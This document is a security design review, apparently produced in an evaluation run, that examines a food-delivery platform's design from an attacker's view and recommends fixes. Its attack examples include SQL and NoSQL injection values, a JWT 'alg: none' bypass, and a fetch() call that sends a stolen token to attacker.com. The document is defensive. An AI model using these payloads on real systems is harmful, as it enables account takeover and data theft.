# Security Design Review: FoodConnect システム設計書
## Variant: v014-adversarial-scoped (Run 2)

**Reviewer Role**: Security Architect with Adversarial Perspective
**Review Date**: 2026-02-10
**Document Analyzed**: test-document-round-014.md

---

## Executive Summary

This security review adopts an attacker's perspective to identify exploitable weaknesses in the FoodConnect design. The analysis reveals **critical authorization gaps** across API endpoints, missing security specifications for authentication token storage, and inadequate data protection measures. The most severe attack vectors include: **IDOR vulnerabilities enabling unauthorized order access**, **JWT storage unspecified (potential XSS-based token theft)**, and **missing endpoint-level authorization for order status updates**.

**Overall Security Posture**: High Risk
**Critical Issues**: 5
**Significant Issues**: 8
**Moderate Issues**: 4

---

## Scoring Summary

| Criterion | Score | Severity |
|-----------|-------|----------|
| 1. Threat Modeling (STRIDE) | 2 | Significant |
| 2. Authentication & Authorization Design | 1 | **Critical** |
| 3. Data Protection | 2 | Significant |
| 4. Input Validation Design | 2 | Significant |
| 5. Infrastructure & Dependency Security | 2 | Significant |

**Average Score**: 1.8 / 5.0

---

## Critical Issues (Immediate Exploitation Risk)

### C1. Missing Object-Level Authorization (IDOR) on Order Endpoints
**Score Impact**: Authorization = 1
**Attack Vector**: Horizontal privilege escalation
**Exploitability**: Trivial

**Analysis from Attacker Perspective**:
```
GET /api/v1/orders
```
The design states "Headers: Authorization: Bearer <token>" but provides no specification for authorization logic. As an attacker, I would:
1. Create a valid customer account and authenticate to obtain a JWT
2. Enumerate order IDs (UUIDs can be predicted or leaked through timing attacks)
3. Request `GET /api/v1/orders?orderId={victim_order_id}` to access other customers' orders

**Missing Security Control**: The design does not specify that Order Service must verify `order.customer_id == authenticated_user.id` before returning order data.

**Impact**: Complete exposure of all customer orders, including delivery addresses, payment information (card_last4), and purchase history. This violates customer privacy and enables targeted social engineering attacks.

**Countermeasures**:
- Explicitly specify: "Order Service MUST verify that the authenticated user's ID matches the order's customer_id before returning order details"
- Add to API spec: "GET /api/v1/orders - Returns only orders where customer_id = authenticated_user.id"
- Implement object-level authorization checks in Order Service for ALL order-related endpoints

**Reference**: Section 5 (API設計) - GET /api/v1/orders endpoint specification

---

### C2. Missing Authorization for Order Status Updates
**Score Impact**: Authorization = 1
**Attack Vector**: Vertical privilege escalation, order manipulation
**Exploitability**: Trivial

**Analysis from Attacker Perspective**:
```
PATCH /api/v1/orders/{orderId}/status
  Headers: Authorization: Bearer <token>
  Request: { status }
```

The design specifies authentication (Bearer token) but **no authorization rules**. As an attacker with a customer account, I would:
1. Capture my own order ID after placing an order
2. Send `PATCH /api/v1/orders/{myOrderId}/status` with `{ "status": "COMPLETED" }` to bypass payment
3. Or send `{ "status": "CANCELLED" }` after receiving delivery to avoid payment

**Missing Security Control**: The design does not specify:
- Which roles can update order status (CUSTOMER? RESTAURANT? DRIVER? ADMIN?)
- Which status transitions are allowed for each role (e.g., CUSTOMER can only cancel PENDING orders, RESTAURANT can move PENDING→CONFIRMED→PREPARING)

**Impact**:
- Payment bypass (customer marks order COMPLETED without paying)
- Service disruption (customer cancels orders after delivery)
- Unauthorized order manipulation by malicious restaurant staff

**Countermeasures**:
- Specify role-based status transition matrix:
  ```
  CUSTOMER: PENDING → CANCELLED (only before CONFIRMED)
  RESTAURANT: PENDING → CONFIRMED → PREPARING
  DRIVER: PREPARING → DELIVERING → COMPLETED
  ADMIN: ANY → ANY
  ```
- Add authorization check: "Order Service MUST validate that the authenticated user's role permits the requested status transition"
- Implement state machine validation to prevent invalid status transitions

**Reference**: Section 5 (API設計) - PATCH /api/v1/orders/{orderId}/status

---

### C3. JWT Storage Mechanism Unspecified (XSS-Based Token Theft Risk)
**Score Impact**: Authentication = 1
**Attack Vector**: XSS → session hijacking
**Exploitability**: High (if localStorage is used)

**Analysis from Attacker Perspective**:
The design specifies JWT authentication (Section 5) but does not specify where tokens are stored on the client side. As an attacker, I would:
1. Inject XSS payload through vulnerable input fields (e.g., delivery address, restaurant review)
2. If JWT is stored in `localStorage` or `sessionStorage`, extract it via JavaScript: `localStorage.getItem('token')`
3. Use stolen token to impersonate victim and place fraudulent orders

**Missing Security Control**: The design does not specify:
- Token storage location (localStorage vs httpOnly cookies)
- XSS protection measures (Content Security Policy, httpOnly flag)

**Impact**: If localStorage is used, any XSS vulnerability leads to complete account takeover. Attacker can access order history, payment methods, and place fraudulent orders.

**Countermeasures**:
- **Specify token storage**: "JWT tokens MUST be stored in httpOnly, Secure, SameSite=Strict cookies to prevent XSS-based theft"
- Add to Section 5: "Authentication tokens are never accessible to JavaScript (httpOnly flag enforced)"
- Implement Content Security Policy (CSP) to mitigate XSS: `Content-Security-Policy: default-src 'self'; script-src 'self'`

**Reference**: Section 5 (API設計) - Authentication section

---

### C4. Payment Card Data Storage Without PCI-DSS Specification
**Score Impact**: Data Protection = 1
**Attack Vector**: Database breach → card data exposure
**Exploitability**: High (if full card data stored)

**Analysis from Attacker Perspective**:
The Payments table includes `card_last4` (Section 4), suggesting card data handling, but the design does not specify:
- Whether full card numbers are stored (even temporarily)
- PCI-DSS compliance measures
- Tokenization strategy with payment gateway

As an attacker who gains database access (e.g., via SQL injection or compromised credentials), I would:
1. Query the Payments table for `card_last4` and correlate with user data
2. If full card data is stored anywhere (even in logs or temporary tables), extract it for fraud

**Missing Security Control**: No specification of PCI-DSS compliance or tokenization strategy. The design mentions "外部決済サービスのトランザクションID" but does not clarify that card data is never stored in the FoodConnect database.

**Impact**: Potential PCI-DSS non-compliance. If full card data is stored, database breach leads to mass card fraud and regulatory penalties.

**Countermeasures**:
- **Explicitly state**: "Payment Service MUST use payment gateway tokenization. Full card numbers are NEVER stored in FoodConnect database"
- Add to Section 4 (Payments table): "card_token (external payment gateway token) - NOT full card number"
- Specify: "Payment processing is handled by PCI-DSS Level 1 compliant payment gateway (e.g., Stripe, Braintree)"

**Reference**: Section 4 (データモデル) - Payments table

---

### C5. Missing Rate Limiting Specification on Authentication Endpoints
**Score Impact**: Threat Modeling (DoS) = 2
**Attack Vector**: Brute force, credential stuffing
**Exploitability**: Trivial

**Analysis from Attacker Perspective**:
```
POST /api/v1/auth/login
POST /api/v1/auth/password-reset
```

The design mentions "API Gateway: ルーティング、レート制限" (Section 3) but does not specify:
- Rate limit thresholds (requests per IP per minute)
- Lockout policy after failed attempts
- CAPTCHA or similar brute-force protection

As an attacker, I would:
1. Obtain leaked email list from data breach
2. Perform credential stuffing attack: automated login attempts with 10,000 email/password pairs
3. If no rate limiting, achieve 1,000+ attempts per minute
4. Spam password reset endpoint to disrupt service or enumerate valid emails

**Missing Security Control**: No rate limit specification for authentication endpoints.

**Impact**:
- Account takeover via brute force
- Service disruption (password reset spam)
- Email enumeration (different responses for valid vs invalid emails)

**Countermeasures**:
- Specify rate limits: "Authentication endpoints limited to 5 requests per IP per minute. After 5 failed login attempts, account locked for 15 minutes"
- Add CAPTCHA after 3 failed attempts
- Implement consistent response times and messages for valid/invalid emails (prevent enumeration)

**Reference**: Section 5 (API設計) - Authentication endpoints

---

## Significant Issues (High Likelihood of Attack)

### S1. Missing Authorization for Payment Initiation
**Score Impact**: Authorization = 1
**Attack Vector**: Unauthorized payment on victim's orders

**Analysis**:
```
POST /api/v1/payments
  Headers: Authorization: Bearer <token>
  Request: { orderId, paymentMethod, cardToken }
```

No specification that Payment Service must verify the authenticated user is the order owner. As an attacker:
1. Obtain victim's order ID (via IDOR vulnerability C1)
2. Initiate payment on victim's order using my payment method
3. Claim victim's order delivery (if delivery address can be modified)

**Countermeasure**: Specify "Payment Service MUST verify order.customer_id == authenticated_user.id before processing payment"

---

### S2. Sensitive Data in Application Logs
**Score Impact**: Data Protection = 2
**Attack Vector**: Information disclosure via log access

**Analysis**:
Section 6 states: "アクセスログには ユーザーID、リクエストパス、レスポンスステータス、処理時間 を記録"

But no specification for PII/sensitive data masking. As an attacker with log access (e.g., compromised admin account or cloud logging console):
1. Search logs for delivery addresses (full addresses in plain text)
2. Extract payment information from error logs (e.g., failed payment attempts with card_last4)

**Countermeasure**: Add "Logs MUST mask PII: delivery addresses, phone numbers, email addresses, payment details. Log only hashed/truncated identifiers"

---

### S3. Missing Session Timeout Specification
**Score Impact**: Authentication = 1
**Attack Vector**: Session hijacking via stolen device

**Analysis**:
Section 5 specifies "トークン有効期限: 24時間" but no idle session timeout. As an attacker:
1. Steal user's unlocked mobile device
2. Access FoodConnect app (JWT still valid for 24 hours)
3. Place fraudulent orders over extended period

**Countermeasure**: Specify "Implement idle session timeout: 15 minutes of inactivity requires re-authentication"

---

### S4. Password Complexity Requirements Missing
**Score Impact**: Authentication = 2
**Attack Vector**: Weak password brute force

**Analysis**:
Section 7 states "パスワードは bcrypt でハッシュ化" but no password complexity requirements. As an attacker:
1. If weak passwords allowed (e.g., "123456"), brute force becomes trivial
2. Even with rate limiting, dictionary attacks on leaked password hashes succeed

**Countermeasure**: Specify "Password requirements: minimum 12 characters, must include uppercase, lowercase, number, special character. Reject passwords from common password lists"

---

### S5. Database Connection String and Secrets Management Unspecified
**Score Impact**: Infrastructure = 2
**Attack Vector**: Hardcoded credentials or insecure secret storage

**Analysis**:
Section 2 mentions "PostgreSQL 15, Redis 7.0" and Section 6 mentions "Docker イメージを ECR に保存" but no specification for secret management:
- Where are database credentials stored? (Hardcoded? Environment variables? AWS Secrets Manager?)
- Credential rotation policy?

As an attacker who compromises a container or CI/CD pipeline:
1. Extract hardcoded database credentials from Docker image or environment variables
2. Connect directly to RDS instance if security group allows external access
3. Extract all customer data

**Countermeasure**: Specify "Database credentials stored in AWS Secrets Manager with automatic rotation enabled (90-day cycle). Application retrieves secrets at runtime, never hardcoded in images or config files"

---

### S6. Missing Input Validation Specification
**Score Impact**: Input Validation = 2
**Attack Vector**: Injection attacks (SQL, NoSQL, Command Injection)

**Analysis**:
The design mentions Spring Security and Hibernate but provides no input validation policy. As an attacker:
1. Test injection payloads in all input fields (email, delivery address, menu item names)
2. SQL injection: `email = "admin'--"` in login endpoint
3. NoSQL injection: `restaurantId = { "$ne": null }` to bypass filters
4. Command injection: delivery address with shell metacharacters if processed by external mapping service

**Missing Controls**: No specification for:
- Parameterized queries / ORM usage (Hibernate should prevent SQL injection, but must be verified)
- Input sanitization policy
- Maximum field lengths (delivery address could be 1MB payload → DoS)

**Countermeasure**: Specify "All user inputs MUST be validated: parameterized queries (no string concatenation), maximum field lengths enforced (email: 255, address: 500), special characters sanitized for shell/SQL contexts"

---

### S7. Missing CORS Policy Specification
**Score Impact**: Threat Modeling (Tampering) = 2
**Attack Vector**: CSRF, unauthorized API access from malicious origins

**Analysis**:
Section 3 mentions "API Gateway" but no CORS policy. As an attacker:
1. Host malicious website at `evil.com`
2. Embed JavaScript that calls `POST /api/v1/orders` with victim's JWT (if stored in localStorage)
3. If CORS allows `*` origin, successfully place fraudulent orders

**Countermeasure**: Specify "API Gateway MUST enforce CORS policy: only whitelisted origins allowed (e.g., foodconnect.com, admin.foodconnect.com). Credentials (cookies/Authorization header) only accepted from whitelisted origins"

---

### S8. Error Messages May Leak Internal Information
**Score Impact**: Threat Modeling (Information Disclosure) = 2
**Attack Vector**: Information gathering for targeted attacks

**Analysis**:
Section 6 states "内部エラー詳細（スタックトレース等）はログに記録" but does not specify what clients receive. As an attacker:
1. Send malformed requests to trigger errors
2. If error responses include stack traces, database table names, or internal IP addresses → reconnaissance
3. Example: `{"error": "NullPointerException at com.foodconnect.order.OrderService.validatePayment:127"}` reveals internal class structure

**Countermeasure**: Specify "Client error responses MUST use generic messages: { \"error\": \"Invalid request\", \"code\": \"ERR_400\" }. Internal details (stack traces, database errors) logged server-side only"

---

## Moderate Issues (Exploitable Under Specific Conditions)

### M1. Delivery Address Not Validated for PII Injection
**Score Impact**: Data Protection = 2
**Attack Vector**: PII leakage via log injection

**Analysis**:
Delivery address is free text (TEXT column, Section 4). As an attacker:
1. Enter malicious delivery address: `"123 Main St\nCREDIT_CARD: 4111-1111-1111-1111\nSSN: 123-45-6789"`
2. If logged without sanitization, PII appears in logs
3. If logs shipped to third-party monitoring (e.g., Datadog), compliance violation

**Countermeasure**: Validate address format, limit special characters, mask addresses in logs

---

### M2. No Specification for JWT Signature Algorithm
**Score Impact**: Authentication = 2
**Attack Vector**: Algorithm confusion attack (HS256 vs RS256)

**Analysis**:
Section 5 mentions "JWT" but not signature algorithm. As an attacker:
1. If symmetric HS256 used and secret key leaked → forge tokens
2. Algorithm confusion: change header `"alg": "RS256"` to `"alg": "none"` to bypass signature validation (if not properly configured)

**Countermeasure**: Specify "JWT signed with RS256 (asymmetric). Private key stored in AWS Secrets Manager, public key in API Gateway. HS256 and 'none' algorithm explicitly rejected"

---

### M3. Insufficient Logging for Audit Trail
**Score Impact**: Threat Modeling (Repudiation) = 3
**Attack Vector**: Attacker actions not traceable

**Analysis**:
Section 6 specifies access logs but no audit trail for critical actions:
- Order status changes (who changed PENDING → CANCELLED?)
- Payment refunds (admin action audit?)
- User role changes (CUSTOMER promoted to ADMIN?)

As an attacker who gains temporary admin access:
1. Perform malicious actions (refund all orders, delete users)
2. If not logged with admin user ID and timestamp, actions cannot be traced back

**Countermeasure**: Specify "Audit log for critical actions: order status changes (user ID, timestamp, old/new status), payment refunds (admin ID, reason), role changes (admin ID, target user, old/new role). Audit logs immutable (write-only, stored in separate S3 bucket)"

---

### M4. PostgreSQL Encryption at Rest Not Specified
**Score Impact**: Data Protection = 2
**Attack Vector**: Data breach via physical storage compromise

**Analysis**:
Section 6 mentions "RDS は Multi-AZ 構成" but no encryption specification. As an attacker:
1. If AWS account compromised or malicious insider at AWS datacenter
2. If RDS storage not encrypted, extract database files directly
3. Obtain all customer data, payment info, delivery addresses

**Countermeasure**: Specify "RDS encryption at rest enabled (AES-256). Encryption keys managed by AWS KMS with automatic rotation"

---

## Infrastructure Security Analysis

| Component | Configuration | Security Measure | Status | Risk Level | Attack Vector |
|-----------|---------------|------------------|--------|------------|---------------|
| **PostgreSQL RDS** | Access control, encryption, backup | Multi-AZ specified, no encryption at rest specified | **Partial** | **High** | Database compromise → unencrypted customer data exposure. Missing: encryption at rest, network isolation (VPC config not specified), backup encryption |
| **Redis ElastiCache** | Network isolation, authentication | No specification | **Missing** | **High** | If Redis exposed or no AUTH, attacker can: read session tokens, flush cache (DoS), inject malicious session data. Missing: AUTH enabled, encryption in transit/at rest, VPC isolation |
| **S3 Storage** | Access policies, encryption | Static files mentioned, no security config | **Missing** | **Medium** | If S3 bucket publicly accessible or no encryption, attacker can: access uploaded images, inject malicious files (XSS via SVG upload). Missing: bucket policy (private access only), encryption at rest, versioning for audit |
| **API Gateway** | Authentication, rate limiting, CORS | Rate limiting mentioned, no specifics | **Partial** | **High** | Missing CORS policy, rate limit thresholds, WAF integration. Attacker can: brute force (no rate limit spec), CSRF (no CORS), exploit common web vulnerabilities (no WAF) |
| **Secrets Management** | Rotation, access control, storage | Not specified | **Missing** | **Critical** | If secrets hardcoded or in environment variables, attacker who compromises container/CI pipeline can: extract database credentials, API keys, JWT signing keys → full system compromise |
| **Dependencies** | Version management, vulnerability scanning | Spring Boot 3.1, Java 17 specified, no scanning | **Partial** | **Medium** | If vulnerable dependencies deployed (e.g., Log4Shell), attacker can: remote code execution, data exfiltration. Missing: automated vulnerability scanning (Snyk, Dependabot), SCA in CI/CD |
| **ECS Fargate** | Task role, network security | Deployment mentioned, no security config | **Missing** | **High** | Missing: task IAM role (least privilege), security group rules (only API Gateway → ECS allowed), container image scanning. Attacker can: escalate privileges if overly permissive IAM, lateral movement if insecure security groups |
| **CloudFront** | TLS config, origin access | Static file CDN mentioned | **Missing** | **Low** | Missing: TLS 1.2+ enforced, S3 origin access identity (OAI) to prevent direct S3 access. Attacker can: MITM if weak TLS, bypass CloudFront and access S3 directly |

**Critical Infrastructure Gaps**:
1. **Secrets Management**: No specification (Critical)
2. **Redis Authentication**: No AUTH or encryption specified (High)
3. **Database Encryption**: At-rest encryption not specified (High)
4. **Network Isolation**: No VPC, security group, or network segmentation specified (High)

---

## Positive Security Aspects

1. **Password Hashing**: bcrypt specified (Section 7) - Strong hashing algorithm resistant to brute force
2. **HTTPS Enforcement**: All communication encrypted (Section 7) - Prevents eavesdropping
3. **JWT Expiration**: 24-hour token expiration limits stolen token lifetime (Section 5)
4. **Refresh Token**: 30-day refresh token enables long-term sessions without storing long-lived access tokens (Section 5)
5. **Multi-AZ Database**: RDS Multi-AZ provides high availability and data durability (Section 6)
6. **Blue/Green Deployment**: Minimizes deployment risk and enables rollback (Section 6)

---

## Attack Chain Examples

### Attack Chain 1: Order Fraud via IDOR + Authorization Bypass
1. Attacker creates customer account → obtains valid JWT
2. Exploits IDOR (C1) to enumerate victim orders: `GET /api/v1/orders?orderId={victim_id}`
3. Exploits missing authorization (C2) to cancel victim's order: `PATCH /api/v1/orders/{victim_id}/status { "status": "CANCELLED" }`
4. Victim's order cancelled, payment potentially refunded, service disruption

**Impact**: Financial loss, customer dissatisfaction, reputation damage

---

### Attack Chain 2: Account Takeover via XSS + JWT Theft
1. Attacker injects XSS payload via delivery address field (no input validation, S6)
2. Victim views order details → XSS executes
3. If JWT in localStorage (C3), attacker's script exfiltrates token: `fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))`
4. Attacker uses stolen JWT to impersonate victim, access order history, place fraudulent orders

**Impact**: Complete account takeover, fraudulent orders, privacy breach

---

### Attack Chain 3: Database Breach via Secret Exposure
1. Attacker compromises CI/CD pipeline (e.g., leaked GitHub token)
2. Extracts database credentials from Docker image environment variables (S5)
3. If RDS security group allows external access, connects directly to database
4. If encryption at rest not enabled (M4), extracts all customer data in plain text
5. Sells customer data (emails, addresses, phone numbers, order history) on dark web

**Impact**: Mass data breach, GDPR fines, class-action lawsuit, business shutdown

---

## Recommendations Priority

### Immediate Actions (Pre-Production Blockers)
1. **Add Object-Level Authorization** (C1, C2): Specify authorization checks for ALL endpoints
2. **Specify JWT Storage Mechanism** (C3): Require httpOnly cookies, never localStorage
3. **Define Secrets Management Strategy** (S5): Use AWS Secrets Manager for all credentials
4. **Implement Rate Limiting** (C5): Specify thresholds for authentication endpoints
5. **Clarify PCI-DSS Compliance** (C4): Tokenization strategy for payment data

### High Priority (Launch Window)
6. **Add Input Validation Policy** (S6): Parameterized queries, field length limits, sanitization
7. **Specify CORS Policy** (S7): Whitelist origins, reject wildcard
8. **Configure Redis Security** (Infrastructure table): AUTH enabled, encryption in transit
9. **Enable RDS Encryption** (M4): Encryption at rest for database
10. **Add Audit Logging** (M3): Critical actions logged with user ID and timestamp

### Medium Priority (Post-Launch Hardening)
11. **Add Idle Session Timeout** (S3): 15-minute inactivity logout
12. **Password Complexity Requirements** (S4): Minimum 12 characters, complexity rules
13. **JWT Signature Algorithm** (M2): Specify RS256, reject HS256/none
14. **Generic Error Messages** (S8): Prevent information leakage
15. **S3 Bucket Hardening** (Infrastructure table): Private access, encryption at rest

---

## Conclusion

From an attacker's perspective, the FoodConnect design presents **critical exploitable weaknesses**, primarily in **authorization controls** and **authentication token security**. The most significant attack vectors are:

1. **IDOR vulnerabilities** enabling unauthorized order access (C1)
2. **Missing endpoint-level authorization** for status updates (C2)
3. **JWT storage unspecified**, creating XSS-based token theft risk (C3)
4. **Insufficient infrastructure security specifications**, particularly secrets management and database encryption

**Immediate remediation required** before production deployment. Without addressing these gaps, the platform is vulnerable to data breaches, fraudulent orders, and account takeovers.

**Overall Risk Assessment**: **HIGH - Production Deployment Not Recommended** until critical issues (C1-C5) are addressed with explicit security specifications in the design document.
